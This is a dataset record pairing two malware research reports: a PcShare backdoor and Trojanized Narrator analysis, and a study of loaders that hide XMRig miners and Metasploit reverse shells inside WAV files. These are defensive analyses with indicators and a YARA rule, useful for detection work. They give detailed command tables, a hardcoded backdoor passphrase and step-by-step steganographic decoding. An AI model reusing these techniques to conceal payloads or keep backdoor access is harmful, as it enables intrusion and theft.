45.32.181.48 DdnsUrl <redacted> SoftVer 1020 Group <redacted> Port 0x50 (80.) HWnd - Id -PcShare BackdoorSHA256 bd345155aa4baa392c3469b9893a4751c2372ae4923cf05872bcdc159b9596f8 (encrypted) 49b86ae6231d44dfc2ff4ad777ea544ae534eb40bd0209defffec1eb1fe66b34 (decrypted) Classification Malware/Backdoor Aliases PcClient, PcMain Size 296 KB (303,104 bytes) Type Binary (PE DLL without a header) Filename PcMain.dll (internal) Timestamp N/AOverviewThe payload is loaded into memory reflectively, so it will never reside on disk in decrypted form. Although the file header is zeroed out, the binary is assumed to have originally been a PE DLL. The backdoor is based on a Chinese Open Source remote access Trojan (RAT) called PcShare, which is available in multiple versions on Github[2]. Some functionality found in the original code is unimplemented, suggesting the attackers stripped unnecessary code to meet specific needs, limit the malicious footprint, and make the binary smaller. In this case, unimplemented features include audio/video streaming and keyboard monitoring, which suggests that this backdoor was used to establish an early stage foothold and intended mainly to download and install other modules.FEATURESDifferent modes of operation, including SSH & Telnet server, self-update mode, file upload and download modesUse of custom LZW algorithm implementation for traffic compressionUse of PolarSSL library to encrypt C&C communication (not present in the open source version)Proxy authentication via local user credentials (not present in the open source version)Several remote administration abilities:o List, create, rename, delete files and directorieso List and kill processeso Edit registry keys and valueso List and manipulate serviceso Enumerate and control windowso Execute binarieso Download additional files from the C&C or provided URLo Upload files to the C&Co Spawn command line shello Navigate to URLso Display message boxeso Reboot or shut down the systemBEHAVIORThe internal name of the DLL is PcMain.dll. It exports two functions, Vip20101125 and WorkMainF. These strings correlate with the PcShare code available on Github:Figure 6: PcMain.dll exported functions (left), and PcShare source code on GitHub (right)The main functionality of the malware is contained in Vip20101125 export, which is invoked from inside the DllMain function. In order to connect to the C&C server, the backdoor first needs to obtain the real C&C address. This is done by reading the content of a remote file located at the URL specified in loader-supplied configuration. The remote file is expected to be a simple plain-text file containing an IP address and a port number. In case no port number is specified, the default port will be set to 80. The malware will then connect to the C&C via TCP socket and send a beacon containing compressed and encrypted system information:Figure 7: Sending C&C beaconIn response, the C&C server is expected to send a command that will specify the requested backdoor connection mode. The received command is then dispatched to a handler:Figure 8: Switch loop to handle connection mode commandThere are several different backdoor modes in line with the original open source code, but some of the options have been removed. Below is a partial list of commands supported by CMyClientMain::GetCmdFromServer:Figure 9: Backdoor modesFigure 10: Portion of original CMyClientMain::GetCmdFromServer from PcMain/MyClientMain.cppThe switch statement that operates the backdoor functionality is contained within the CMyMainTrans::StartWork function. Depending on the chosen connection mode and the OS version, the SSH_MainThread function will either make a direct call to the StartWork function or create another instance of the backdoor DLL and call its WorkMainF export, supplying configuration values as parameters. In case of this particular modification, the unpacked backdoor DLL is never dropped to the disk, so the attackers are limited to the direct method of invoking the backdoor switch:Figure 11: Executing WorkMainF with configuration parametersThe StartWork function initiates the processing of backdoor commands. The command parameters are first decrypted and decompressed using the backdoor's own implementation of the LZW algorithm inside a function called PcUnZip.:Figure 12: Receive, unpack and dispatch commandFigure 13: Supported backdoor commandsC&C CommunicationUnlike the Github version, this version of PcShare can bypass proxies by retrieving the proxy configuration and using it to authenticate:Figure 14: Proxy authentication using user-agent string from Chrome 47 (2015-12-01)The backdoor binary embeds a statically linked instance of the PolarSSL library. All C&C communication is encrypted with the use of an embedded RSA key and compressed using its own implementation of LZW:Figure 15: PolarSSL certificate embedded in the payloadFigure 16: Polar SSL keys and certificates embedded in the payloadBACKDOOR MODESThe first command from the C&C server specifies the connection mode (note, parameters are sent separately):Command Code (Hex/Decimal) Function Parameters Comments WM_CONNECT_FRAM 0x1F41 8001 SSH_FramThread - Start the backdoor command processing loop, the camera capture thread associated with this function in the Github code has been removed WM_CONNECT_FILE 0x1F42 8002 SSH_MainThread - Start the backdoor command processing loop WM_CONNECT_PROC 0x1F43 8003 SSH_MainThread - Start the backdoor command processing loop WM_CONNECT_SERV 0x1F44 8004 SSH_MainThread - Start the backdoor command processing loop WM_CONNECT_KEYM 0x1F45 8005 (unimplemented) - - WM_CONNECT_MULT 0x1F46 8006 (unimplemented) - - WM_CONNECT_TLNT 0x1F47 8007 SSH_TlntThread - Open a terminal connection to the C&C server and send basic system info, in a loop, read and execute shell commands sent by the C&C WM_CONNECT_DL_FILE 0x1F48 8008 SSH_DlThread FilePath Read content of specified file and send it (compressed and encrypted) back to the C&C WM_CONNECT_UPDA 0x1F49 8009 UpdateFile BinaryData Receive file from C&C, write it to a temp file and execute using CreateProcess function, then terminate self WM_CONNECT_TURL 0x1F4A 8010 SSH_TuRlThread URL Download and execute a file from specified URL WM_CONNECT_UPLO 0x1F4B 8011 SSH_FileThread BinaryData Receive a PE EXE file from C&C, write it to a temp file and execute it WM_CONNECT_GDIP 0x1F4C 8012 (unimplemented) - - WM_CONNECT_QUER 0x1F4D 8013 (unimplemented) - - WM_CONNECT_REGT 0x1F4E 8014 SSH_MainThread - Start the backdoor command processing loop WM_CONNECT_CWND 0x1F4F 8015 SSH_MainThread - Spawn new instance of the backdoor DLL and invoke WorkMainF export, which will start the backdoor command processing loop WM_CONNECT_MESS 0x1F50 8016 SSH_MessThread Type, Text Display a message box with the specified text WM_CONNECT_LINK 0x1F51 8017 SSH_LinkThread ShowCmd, URL Open specified URL in Internet Explorer WM_CONNECT_SOCKS 0x1F52 8018 - WM_CONNECT_TWOO 0x1F53 8019 - WM_CONNECT_FIND 0x1F54 8020 SSH_MainThread - Start the backdoor command processing loop WM_CONNECT_CMD 0x1F55 8021 (unimplemented) - - WM_CONNECT_VIDEO 0x1F56 8022 (unimplemented) - - WM_CONNECT_AUDIO 0x1F57 8023 (unimplemented) - - WM_CONNECT_UP_FILE 0x1F58 8024 SSH_UpThread FilePath, BinaryData Receive a file name from the C&C and write it with the received binary data WM_CONNECT_GET_KEY 0x1F59 8025 (unimplemented) - - WM_CONNECT_SOCKS_STOP 0x1F5A 8026 SSH_StopSocksThread - Stop backdoor communication WM_CONNECT_CLIENT_DOWN 0x1F5B 8027 SSH_StopSocksThread - Stop backdoor communication CLIENT_PRO_UNINSTALL 30002 - - Return ""uninstall"" flag CLIENT_SYSTEM_RESTART 30004 ShutDownSystem - Reboot the system CLIENT_SYSTEM_SHUTDOWN 30005 ShutDownSystem - Power off the systemBACKDOOR COMMANDSThe backdoor command processing thread is started in some of the operation modes and it's capable of processing the following commands:Command Code (Hex/Decimal) Parameters Comments GetDiskInfo 0x6EB 1771 RootPath Save information about specified disk (disk name, drive type, volume information and free space) to a temp file GetFileInfo 0x6EC 1772 FilePath Save extended attributes of a file to a temp file GetDirInfo 0x6ED 1773 DirectoryPath Save directory info (extended attributes of a directory, number of subdirectories, number of files and total files size) to a temp file GetDirList 0x6EE 1774 DirectoryPath Save the list of file names found under a specified directory to a temp file DeleteMyFile 0x6EF 1775 FilePath Delete a specified file(s) CreateDir 0x6F0 1776 DirectoryPath Create a specified directory ReNameFile 0x6F1 1777 ExistingFileName, NewFileName Move a specified file GetDiskList 0x6F2 1778 - Save information about all disks (disk name, drive type, volume information and free space) to a temp file ExecFile 0x6F3 1779 FilePath Execute a given application KillOneProcess 0x6F4 1780 PID Terminate process with given PID MyRegEnumKey 0x6F5 1781 SubKey Write a list of registry values stored under a given key to a temp file MyRegDeleteKey 0x6F6 1782 SubKey Delete a specified registry key (unimplemented) 0x6F7 1783 - - MyRegDeleteValue 0x6F8 1784 SubKey, ValueName Delete a specified registry value MyRegEditValue 0x6F9 1785 SubKey, ValueName, Type, Data Set a specified registry value (unimplemented) 0x6FA 1786 - - GetDownFileList 0x6FB 1787 ListOfFiles Save paths, attributes and sizes of given files to a temp file GetProcessList 0x6FC 1788 - Write the list of running processes to a temp file EnumMyServices 0x6FD 1789 - Write the list of services (name, status, config) to a temp file ControlMyServices 0x6FE 1790 ServiceName, State Either start or restart specified service, depending on the second parameter ConfigMyServices 0x6FF 1791 ServiceName, StartType, DisplayName Change start type and display name of a given service (unimplemented) 0x700 1792 - - DeleteMyServices 0x701 1793 ServiceName Delete a specified service GetFindFileList 0x702 1794 Path Find specified file or all files under specified directory, save file names together with their attributes to a temp file MyEnumWindows 0x703 1795 - Write the list of open windows (window text and module name) to a temp file MyControlWindows 0x704 1796 hWnd, CmdShow Either close or manipulate (show, hide, minimize, maximize) a given windowSHA256 0022508fd02bb23c3a2c4f5de0906df506a2fcabc3e841365b60ba4dd8920e0c Classification Malware/Trojan Aliases N/A Size 220 KB (225,280 bytes) Type PE32+ executable (GUI) x86-64, for MS Windows Filename Narrator.exe Timestamp 2015-06-08 05:23:07 PDB path ?C:\myWork\vc\Narrator_window_20150606v1.2\x64\Release\Narrator.pdbOverviewSimilar to the aforementioned ""Sticky Keys"" attack[3], this binary is designed to replace Narrator.exe, a legitimate screen-reader utility belonging to Windows. Leveraging this attack makes it possible for a remote threat actor to gain unauthenticated access to a command prompt running with system privileges via a remote desktop logon screen. In order to deploy the Trojanized Narrator, the attackers will first have had to obtain administrative privileges in the victim's system.This binary is quite novel compared to previous malware that exploits accessibility features in Windows, in that it doesn't attempt to replicate the Narrator user-interface (which is often imitated poorly). Instead, it spawns a copy of the original Narrator.exe and draws a hidden overlapped window[4], where it waits to capture specific key combinations known only to the attacker. When the correct passphrase has been typed the malware will display a dialog that allows the attacker to specify the path to a file to execute.FEATURESReplaces Narrator.exe, a legitimate Windows screen reader applicationRequires attackers to obtain administrative privileges on the victim machine prior to deploymentGrants permanent SYSTEM-level access via logon screenBEHAVIORUpon execution, the Trojanized Fake Narrator will first run the original legitimate Narrator (previously renamed by the threat actor to NarratorMain.exe). The malware will then register a window class (""NARRATOR"") and create a window (""Narrator"").The window procedure creates a dialog with an edit control and a button called ""r"", while a separate thread constantly monitors keyboard strokes. If the malware detects that a specific password has been typed (hardcoded in the binary as ""showmememe"" string), it will display the previously created dialog. This will allow the attacker to specify the command, or the path to a file to execute via an edit control. When the ""r"" button is pressed the malware will read the contents of the edit control and supply the text to a thread that will attempt to run the command via the system API:Figure 17: Fake Narrator - Monitoring the keyboard for hardcoded passwordOnce the Fake Narrator is enabled at the logon screen via ""Ease of Access"", the malware will be executed by winlogon.exe with SYSTEM privileges. Typing the attacker's defined password will allow the attacker to spawn any executable, also running under the SYSTEM account, at the logon screen:Figure 18: Fake Narrator running at RDP login promptThis technique ultimately allows a malicious actor to maintain a persistent shell on a system without requiring valid credentials.ConclusionsThe threat actor behind these attacks tends to modify and reuse publicly available code - this is true both for the foothold backdoor as well as majority of the post-exploitation tools they use. Such an approach requires significantly less resources and speeds up the process of developing an attack toolset. Moreover, open source code is more difficult to attribute as it can be adapted and used by anyone who has access to the Internet and an appropriate compiler.Despite a preference towards open source tools, the attacker doesn't shy away from building their own bespoke utilities as needed, like Fake Narrator. The development timeline of Fake Narrator samples shows the tool was introduced more than four years ago and is still being actively modified in order to better fit the victim's environment. A multi-year period between subsequent versions suggests that this particular tool is rather uncommon and used in a very limited number of cases.The aim of the attackers is persistent exfiltration of sensitive data, as well as local network reconnaissance and lateral movement. The use of Fake Narrator to gain SYSTEM-level privileges indicates the threat actor is interested in long term monitoring of the victim, as opposed to one-off data collection.Based on the use of numerous Chinese open source projects and the geographical location of the victims, we suspect the threat actor to be of Chinese origin. The use of PcShare was previously seen in relation to a group called Tropic Trooper, which has been targeting government institutions and heavy industry in the same region since at least 2012. Tropic Trooper (a.k.a. KeyBoy) is known to use a toolset that includes the PcShare backdoor, alongside another popular backdoor called Poison Ivy, and a bespoke one called Yahoyah.With PcShare being an open source project which could be leveraged by any number of threat actors operating in this region we cannot be completely certain the attack is attributable to Tropic Trooper at this time.Indicators of Compromise (IOCs)Indicator Type Description c5226bfd53d789a895559e8bcbedc4ecdde543e54a427b1cb4e5d7ef90756daa SHA256 PcShare loader 1 1899b3d59a9dc693d45410965c40c464224160bbef596f51d35fda099d609744 SHA256 PcShare loader 2 bd345155aa4baa392c3469b9893a4751c2372ae4923cf05872bcdc159b9596f8 SHA256 PcShare backdoor (encrypted) 49b86ae6231d44dfc2ff4ad777ea544ae534eb40bd0209defffec1eb1fe66b34 SHA256 PcShare backdoor (dump, no PE header) 0022508fd02bb23c3a2c4f5de0906df506a2fcabc3e841365b60ba4dd8920e0c SHA256 Fake Narrator ?945F4106-C691-4921-ACAB-E58C50C5F150 Mutex PcShare loader ?CF08C3F3-2CA3-4215-8CB3-4CDBD3030EC4 Mutex PcShare loader 45.32.181.48 C&C IP PcShare loader 1 ?142.4.124.124 C&C IP PcShare loader 2 C:\myWork\vc\Narrator_window_20150606v1.2\x64\Release\Narrator.pdb PDB path Fake NarratorMITRE ATT&CKTactic ID Name Observed Initial Access T1078 Valid Accounts Execution T1085 Rundll32 PcShare loader Persistence T1100 Webshell T1060 Registry Run Keys PcShare loader Privilege Escalation T1015 Accessibility Features Fake Narrator Defense Evasion T1073 DLL Sideloading PcShare loader T1140 Deobfuscate/Decode Files or Information PcShare loader Discovery T1010 Application Window Discovery PcShare backdoor T1083 File and Directory Discovery PcShare backdoor T1057 Process Discovery PcShare backdoor T1012 Query Registry PcShare backdoor T1082 System Information Discovery PcShare backdoor T1007 System Service Discovery PcShare backdoor Command and Control T1032 Standard Cryptographic Protocol PcShare backdoor T1105 Remote File Copy PcShare backdoor Exfiltration T1041 Exfiltration Over Command and Control Channel PcShare backdoorLinks:[1] https://attack.mitre.org/techniques/T1073/[2] https://github.com/sinmx/pcshare/[3] https://attack.mitre.org/techniques/T1015/[4] https://docs.microsoft.com/en-us/windows/win32/winmsg/window-featuresoverlapped-windows";The ITSecurity report suggests that the threat actor is interested in persistent exfiltration of sensitive data, as well as local network reconnaissance and lateral movement. The use of Fake Narrator to gain SYSTEMlevel privileges indicates the threat actor is interested in long term monitoring of the victim, as opposed to oneoff data collection. Based on the use of numerous Chinese open source projects and the geographical location of the victims, we suspect the threat actor to be of Chinese origin. The use of PcShare was previously seen in relation to a group called Tropic Trooper, which has been targeting government institutions and heavy industry in the same region since at least 2012. Tropic Trooper (a.k.a. KeyBoy) is known to use a toolset that includes the PcShare backdoor, alongside another popular backdoor called Poison Ivy, and a bespoke one called Yahoyah. With PcShare being an open source project which could be leveraged by any number of threat actors operating in this region we cannot be completely certain the attack is attributable to Tropic Trooper at this time.;en;{'r': 0.07670850767085077, 'p': 0.9734513274336283, 'f': 0.14221072909184285};{'r': 0.05699671172816953, 'p': 0.9512195121951219, 'f': 0.10754911992603439};{'r': 0.07670850767085077, 'p': 0.9734513274336283, 'f': 0.14221072909184285}
https://blogs.blackberry.com/en/2019/10/malicious-payloads-hiding-beneath-the-wav;Malicious Payloads - Hiding Beneath the WAV;"IntroductionBlackBerry Cylance Threat Researchers recently discovered obfuscated malicious code embedded within WAV audio files. Each WAV file was coupled with a loader component for decoding and executing malicious content secretly woven throughout the file's audio data. When played, some of the WAV files produced music that had no discernible quality issues or glitches. Others simply generated static (white noise).Our analysis reveals some of the WAV files contain code associated with the XMRig Monero CPU miner. Others included Metasploit code used to establish a reverse shell. Both payloads were discovered in the same environment, suggesting a two-pronged campaign to deploy malware for financial gain and establish remote access within the victim network.The WAV file loaders can be grouped into the following three categories, which we will discuss in detail:Loaders that employ Least Significant Bit (LSB) steganography to decode and execute a PE file. Loaders that employ a rand()-based decoding algorithm to decode and execute a PE file. Loaders that employ rand()-based decoding algorithm to decode and execute shellcode.Each approach allows the attacker to execute code from an otherwise benign file format. These techniques demonstrate that executable content could theoretically be hidden within any file type, provided the attacker does not corrupt the structure and processing of the container format. Adopting this strategy introduces an additional layer of obfuscation because the underlying code is only revealed in memory, making detection more challenging.It is worth noting that the steganography loader we discovered is also identified in Symantec's June 2019 analysis[1] of Waterbug/Turla threat actor activity. In addition, Symantec identified WAV files containing encoded Metasploit code. These similarities may point to a relationship between the attacks, though definitive attribution is challenging because different threat actors may use similar tools. Also, our analysis focuses primarily on loaders, which are an initial stage of execution used to launch additional code. Different threat actors may use the same publicly available loader to execute unrelated second-stage malware.LoadersSteganography PE LoaderOverviewThe first category of loaders employs steganography to extract executable content from a WAV file. Steganography is the practice of concealing a file or message within another file, ideally without raising suspicion about the target file. Attackers have used steganography techniques to hide data in the past, in fact, BlackBerry Cylance Threat Research published a report[2] in April that describes how the OceanLotus Threat Group leveraged steganography to conceal malicious backdoor payloads within image files. In this instance, code is hidden within the audio file using the Least Significant Bit (LSB) technique, where the right-most bit of an individual byte contains the data of interest. One publicly available[3] WAV file loader we discovered has the following characteristics:SHA-256 595A54F0BBF297041CE259461AE8A12F37FB29E5180705EAFB3668B4A491CECC File Type PE32+ executable (GUI) x86-64, for MS Windows Size 107,008 bytes Compile Timestamp Tuesday, May 29, 2018 13:07:05 UTC PDB Path f:\w\xmrig\iskander\x64\release\iskander.pdb Version Information Language: U.S. EnglishCompany Name: Microsoft CorporationFile Description: Microsoft MediaPlayerFile Version: 12.6.7600.16385Legal Copyright: Microsoft Corporation. All rights reserved.Original Filename: MSTCSS.EXEProduct Name: Microsoft Windows Operating SystemProduct Version: 15.3.7600.16385Note that the 32-bit version of this loader is also publicly available[4], though it will not be discussed in detail here.Unlike other loaders mentioned in this article, this loader contains hardcoded strings that specify the filename to load (""Song.wav"") and, once decoded, the exported function to execute (""Start""). The Song.wav file is publicly available[5] within a zip file:SHA-256 DB043392816146BBE6E9F3FE669459FEA52A82A77A033C86FD5BC2F4569839C9 Filename Song.wav File Type RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 44100 Hz Size 15,179,596Upon execution, the loader will read Song.wav (assuming it is in the same directory), extract a DLL in memory, and execute the ""Start"" export. The extracted file is associated with the XMRig Monero CPU miner:SHA-256 A2923D838F2D301A7C4B46AC598A3F9C08358B763B1973B4B4C9A7C6ED8B6395 File Type PE32+ executable (DLL) (console) x86-64, for MS Windows Size 733,696 bytes Compile Timestamp Monday, May 28 2018 19:45:53 GMT PDB Path n/a Exports Start Version Information Language: NeutralCompany Name: www[.]xmrig[.]comFile Description: XMRig CPU minerFile Version: 2.6.2Legal Copyright: Copyright (C) 2016-2018 xmrig[.]comOriginal Filename: xmrig.exeProduct Name: XMRigProduct Version: 2.6.2Attackers deploy CPU miners to steal processing resources and generate revenue from mining cryptocurrency. Cryptocurrency miners are a popular malware payload since they provide financial benefit and aim to operate in the background without the user's knowledge. An effective cryptocurrency botnet can yield thousands of dollars per month for an attacker.Technical DetailsThe header of a WAV (RIFF) file is 44 bytes long, and the last four bytes indicate the size of the data section. In Song.wav, the data size is 0xE79F20 (little endian) or 15,179,552 bytes:Figure 1: WAV file header - data sizeIn the code snippet below, the loader reads in these four bytes and uses the value to allocate space in memory. Then, it reads the data and closes the WAV file. Finally, the do-while loop iterates over every other byte within the first 64 bytes (i.e., it skips one byte) and extracts LSBs to determine the size of the decoded data:Figure 2: Decode file sizeTo better understand the code above, recognize that the loop executes while counter < 32 and counter increments by one with each iteration. Also, data_offset represents the offset within the encoded data, and its value increments by two with each iteration, beginning with zero. In total, this loop will cover the first 64 bytes of data (32 * 2):Figure 3: WAV file data - 64 bytesFor each byte processed, the loader will extract the LSB and assign it to appropriate bit position in decoded_size, beginning with 31(i.e., the left-most bit) and decrementing by 1 with each iteration. Applying this algorithm to the first 64 bytes of data gives us the following (skipped bytes not included):Hex Binary (LSB underlined) Bit Position LSB assigned to bit position FC 1111110 0 31 0 0000000 00000000 00000000 00000000 E6 1110011 0 30 0 0 000000 00000000 00000000 00000000 06 0000011 0 29 00 0 00000 00000000 00000000 00000000 06 0000011 0 28 000 0 0000 00000000 00000000 00000000 00 0000000 0 27 0000 0 000 00000000 00000000 00000000 00 0000000 0 26 00000 0 00 00000000 00000000 00000000 00 0000000 0 25 000000 0 0 00000000 00000000 00000000 00 0000000 0 24 0000000 0 00000000 00000000 00000000 02 0000001 0 23 00000000 0 0000000 00000000 00000000 02 0000001 0 22 00000000 0 0 000000 00000000 00000000 00 0000000 0 21 00000000 00 0 00000 00000000 00000000 00 0000000 0 20 00000000 000 0 0000 00000000 00000000 FF 1111111 1 19 00000000 0000 1 000 00000000 00000000 FE 1111111 0 18 00000000 00001 0 00 00000000 00000000 FF 1111111 1 17 00000000 000010 1 0 00000000 00000000 FF 1111111 1 16 00000000 0000101 1 00000000 00000000 FE 1111111 0 15 00000000 00001011 0 0000000 00000000 FE 1111111 0 14 00000000 00001011 0 0 000000 00000000 FF 1111111 1 13 00000000 00001011 00 1 00000 00000000 FF 1111111 1 12 00000000 00001011 001 1 0000 00000000 FE 1111111 0 11 00000000 00001011 0011 0 000 00000000 FE 1111111 0 10 00000000 00001011 00110 0 00 00000000 FF 1111111 1 9 00000000 00001011 001100 1 0 00000000 FE 1111111 0 8 00000000 00001011 0011001 0 00000000 FC 1111110 0 7 00000000 00001011 00110010 0 0000000 FC 1111110 0 6 00000000 00001011 00110010 0 0 000000 FC 1111110 0 5 00000000 00001011 00110010 00 0 00000 FC 1111110 0 4 00000000 00001011 00110010 000 0 0000 FE 1111111 0 3 00000000 00001011 00110010 0000 0 000 FE 1111111 0 2 00000000 00001011 00110010 00000 0 00 00 0000000 0 1 00000000 00001011 00110010 000000 0 0 00 0000000 0 0 00000000 00001011 00110010 0000000 0The final 32-bit binary value 00000000 00001011 00110010 00000000 has a hex representation of 0xB3200 or decimal value of 733,696. This value is placed into decoded_size.Next, memory of size decoded_size is allocated and various calculations are performed. Default label names were modified to indicate the results of all calculations. These numbers will be used as offsets into the encoded data in the upcoming decoding loop:Figure 4: Allocate memory and calculate offsetsFollowing the above code, a do-while loop begins to decode the remainder of the encoded data:Figure 5: Decode file contentsSimilar to the previous decoding loop, this one extracts the LSB of every other byte. One difference, however, is that it begins assigning bits at the lowest (right-most) bit position. Each iteration extracts the LSB from 8 bytes to form 8 bits (1 byte) of decoded data. Let's apply this algorithm to generate two bytes of decoded data. Since 8 bits comprise a single decoded byte, and one LSB is extracted from every two encoded bytes, generating two decoded bytes requires 32 encoded bytes (2 decoded bytes * 8 LSBs per decoded byte * 2 = 32):Figure 6: 32 bytes of encoded dataThe first byte of decoded data will be produced as follows (skipped encoded bytes not included):Hex Binary (LSB underlined) Bit Position LSB assigned to bit position 01 0000000 1 0 0000000 1 00 0000000 0 1 000000 0 1 FF 1111111 1 2 00000 1 01 FF 1111111 1 3 0000 1 101 FC 1111110 0 4 000 0 1101 FC 1111110 0 5 00 0 01101 FD 1111110 1 6 0 1 001101 FC 1111110 0 7 0 1001101The second byte of decoded data is produced as follows (again, skipped encoded bytes not included):Hex Binary (LSB underlined) Bit Position LSB assigned to bit position FE 1111111 0 0 0000000 0 FF 1111111 1 1 000000 1 0 00 0000000 0 2 00000 0 10 01 0000000 1 3 0000 1 010 FF 1111111 1 4 000 1 1010 FE 1111111 0 5 00 0 11010 FB 1111101 1 6 0 1 011010 FA 1111101 0 7 0 1011010As a result, the first two bytes have binary values of 01001101 and 01011010, respectively. Hex representations for both bytes are 0x4D5A, referring to the well-known ""MZ"" bytes typically found at the beginning of a Windows Portable Executable (PE) file.The do-while loop will continue iterating until the XMRig DLL is produced in memory. Finally, the decoded DLL is mapped into memory and the ""Start"" export is executed to launch cryptomining activity.Rand()-based PE LoaderOverviewThe second category of loader uses a rand()-based decoding algorithm to hide shellcode. One example of this loader is publicly available[6] and has the following characteristics:SHA-256 843CD23B0D32CB3A36B545B07787AC9DA516D20DB6504F9CDFFA806D725D57F0 File Type PE32+ executable (GUI) x86-64, for MS Windows Size 156,672 bytes Compile Timestamp Tuesday, June 06 2018 11:09:52 UTC PDB Path d:\source\mining\wavdllplayer\x64\release\wavdllplayer.pdb Version Information Language: U.S. EnglishCompany Name: Microsoft CorporationFile Description: Host Process for Windows TasksFile Version: 10.0.16299.15Legal Copyright: Microsoft Corporation. All rights reserved.Original Filename: taskhostw.exeProduct Name: Microsoft(r) Windows(r) Operating SystemProduct Version: 10.0.16299.15To load a WAV file with this loader the following command line must be used:<Loader EXE> <WAV File> <Decoded PE File Entry Point>An example of a compatible (and publicly available[7]) WAV file has the following characteristics:SHA-256 7DC620E734465E2F5AAF49B5760DF634F8EC8EEAB29B5154CC6AF2FC2C4E1F7C Filename click.wav File Type RIFF (little-endian) data, WAV audio, Microsoft PCM, 8 bit, mono 44100 Hz Size 733,740 bytesUnlike the first WAV file discussed, this audio file has legitimate headers but no music when played - the audio sounds like white noise.When executing the loader with the above WAV file, the loader will read the file, extract a DLL in memory, and attempt to execute the specified entry point. Similar to the first scenario, the extracted file is associated with the XMRig Monero CPU miner:SHA-256 ED58FDB450D463B0FE3BBC6B9591203F6D51BF7A8DC00F9A03978CECD57822E1 File Type PE32+ executable (DLL) (console) x86-64, for MS Windows Size 733,696 bytes Compile Timestamp Monday, May 28 2018 19:45:53 GMT PDB Path n/a Exports Start Version Information Language: NeutralCompany Name: www[.]xmrig[.]comFile Description: XMRig CPU minerFile Version: 2.6.2Legal Copyright: Copyright (C) 2016-2018 xmrig[.]comOriginal Filename: xmrig.exeProduct Name: XMRigProduct Version: 2.6.2In fact, this file is almost identical to the DLL decoded from Song.wav, with the exception of four bytes at the end of the file (additional details are in the next section).Technical DetailsUpon execution, this loader will read the WAV header, extract the data size, allocate memory accordingly, and store the WAV data in the newly allocated memory. Next, the loader approaches the code responsible for decoding the WAV file's data content:Figure 7: Rand()-based PE loader decoding loopNote that size_of_data represents the data size extracted from the WAV header and wave_data contains the address of the encoded WAV data. The loader uses an initial call to srand() and repeated calls to rand() to extract a PE file from the WAV data. As described on Microsoft's website[8], the srand() API ""sets the starting point for generating a series of pseudorandom integers in the current thread"", and the rand API ""retrieves the pseudorandom numbers that are generated"". Given a seed supplied to srand(), calls to rand() will return the same pseudorandom numbers each time it is called.The do-while loop traverses each byte of the encoded data, replacing the byte with the result of subtracting rand() output from the encoded byte. For example, let's decode the first two bytes of data shown here:Using the loader and WAV file specified earlier in this section, the chart below shows values for the first two iterations with a srand() seed value of 0x309:Loop Run WAV Data (Byte) rand() Output (lower byte) Difference 1 0x5C 0x0F 0x5C - 0x0F = 0x4D 2 0x99 0x3F 0x99 - 0x3F = 0x5AThese first two bytes represent the ""MZ"" characters typically present at the beginning of a Windows executable. Once the loop runs over all data bytes, the result is a 64-bit DLL associated with the XMRig Monero CPU miner. The resulting DLL differs by only four bytes from the DLL decoded from Song.wav:Figure 8: Decoded click.wav vs. Song.wavWhile it is unclear why these bytes differ, they do not contribute to the functionality of the DLL, so the XMRig DLL files are virtually the same.Next, the loader acquires the address of the export specified in the command line. If it exists, the loader will launch a thread to execute it:Figure 9: Identify address of export and launch thread to execute itRand()-based Shellcode LoaderOverviewThe third category of loader uses a rand()-based decoding algorithm to hide PE files. One example of this loader is publicly available[9] and has the following characteristics:SHA-256 DA581A5507923F5B990FE5935A00931D8CD80215BF588ABEC425114025377BB1 File Type PE32+ executable (GUI) x86-64, for MS Windows Size 90,112 bytes Compile Timestamp Monday, June 18, 2018 18:54:48 UTC PDB Path D:\source\mining\wavPayloadPlayer\x64\Release\wavPayloadPlayer.pdb Version Information Language: U.S. EnglishCompany Name: Microsoft CorporationFile Description: Host Process for Windows TasksFile Version: 10.0.16299.15 (WinBuild.160101.0800)Legal Copyright: Microsoft Corporation. All rights reserved.Original Filename: taskhostw.exeProduct Name: Microsoft Windows Operating SystemProduct Version: 10.0.16299.15To load a WAV file with this loader, the following command line must be used (no entry point necessary):<Loader EXE> <WAV File>Similar to the previous loader, any audio files paired with this loader only contained white noise with no musical content. Upon execution, this loader opens a compatible WAV file, reads its data, decodes its contents, and attempts to execute the shellcode.While no public samples of compatible WAV files are available, both files discovered contained Metasploit code that launches a reverse shell to a specified IP address.Technical DetailsSimilar to the previous loader, this one will read the WAV header, determine the data size, allocate memory, and read the data. The decoding code is virtually identical, including the use of the same srand() seed:Figure 10: Rand()-based shellcode loader decoding loopThe only notable difference is the immediate call to CreateThread after the decoding loop completes. No supporting code is necessary to parse the file structure since this loader only handles shellcode.An analysis of the decoded shellcode from two WAV files revealed code strikingly similar to the Metasploit reverse TCP[10] and reverse HTTPS[11] code. In both cases, the shellcode attempts a connection to the IP address 94.249.192.103. The reverse TCP connection occurs over port 3527 while the reverse HTTPS connection occurs over port 443.ConclusionAttackers are creative in their approach to executing code, including the use of multiple files of different file formats. We discovered several loaders in the wild that extract and execute malicious code from WAV audio files. Analysis revealed that the malware authors used a combination of steganography and other encoding techniques to deobfuscate and execute code. These strategies allowed attackers to conceal their executable content, making detection a challenging task. In this case, attackers employed obfuscation to both perform cryptomining activities and establish a reverse connection for command and control. The similarities between these methods and known threat actor TTPs may indicate an association or willingness to emulate adversary activity, perhaps to avoid direct attribution.AppendixIndicators of Compromise (IOCs):Indicator Type Description 595A54F0BBF297041CE259461AE8A12F37FB29E5180705EAFB3668B4A491CECC SHA-256 Steg Loader 843CD23B0D32CB3A36B545B07787AC9DA516D20DB6504F9CDFFA806D725D57F0 SHA-256 PE Loader DA581A5507923F5B990FE5935A00931D8CD80215BF588ABEC425114025377BB1 SHA-256 Shellcode Loader DB043392816146BBE6E9F3FE669459FEA52A82A77A033C86FD5BC2F4569839C9 SHA-256 WAV File 7DC620E734465E2F5AAF49B5760DF634F8EC8EEAB29B5154CC6AF2FC2C4E1F7C SHA-256 WAV File 94.249.192.103 IP address Shellcode IPYARA Rule for Rand() Encoded WAV Files:rule rand_encoded_wav{strings:$RIFF = ""RIFF""$WAVE = ""WAVE"" $SHELLCODE = {0B 87 06 53 DF 3A}$MZ = {5C 99 13 6F F2 52} condition:$RIFF at 0 and $WAVE at 8 and ($MZ at 44 or $SHELLCODE at 44)}MITRE AT&CK Techniques:Tactic ID Name Description Defense Evasion T1027 Obfuscated Files or Information Steganography is used to hide a PE file within a WAV audio file. Execution T1059 Command-Line Interface Encoded shellcode executes Metasploit code to initiate a reverse shell. Command and Control T1043 Commonly Used Port The reverse HTTPS connection occurs over port 443. Command and Control T1065 Uncommonly Used Port The reverse 